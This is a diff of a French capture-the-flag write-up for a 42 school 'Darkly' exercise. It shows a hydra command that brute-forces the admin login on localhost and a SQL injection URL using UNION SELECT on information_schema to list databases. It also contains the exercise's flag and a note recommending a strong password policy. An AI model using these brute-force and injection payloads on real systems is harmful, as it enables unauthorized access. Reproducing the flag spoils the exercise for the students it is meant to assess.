@@ -10,9 +10,7 @@ source des mots de passes:
 
 Ensuite on utilise un outil hydra qui permet de tester un nombre de mots de passes. avec cette commande:
 
-hydra -l admin -P passwords.txt -s 8080 -f -V 127.0.0.1 \ 
-  http-get-form \
-  "/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:S=flag"
+./hydra -l admin -P ~/Documents/42/darkly/bruteforce/Resources/passwords.txt 127.0.0.1 -s 8080 http-get-form "/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:S=flag"
 
 on passe en parametre:
 - -l qui est une liste d'utilisateur => pour nous ce sera seulement admin
@@ -22,11 +20,12 @@ on passe en parametre:
 - l'url
 - :S=flag => parametre hydra permettant de donner la condition de succes qui est le mot cle flag
 
-le flag est: b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2
+Pour se premunir de ca il faut mettre en place une politique de mot de passe forte
 
 AUTRES METHODES
 
 - Lister les tables de la database: http://localhost:8080/?page=member&id=-1%20UNION%20SELECT%201,group_concat(schema_name)%20FROM%20information_schema.schemata&Submit=Submit#
+
 - Voici les differentes base de donnees presentes dans le projet:
     information_schema,
     Member_Brute_Force,
@@ -34,3 +33,5 @@ AUTRES METHODES
     Member_guestbook,
     Member_images,
     Member_survey
+
+le flag est: b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2
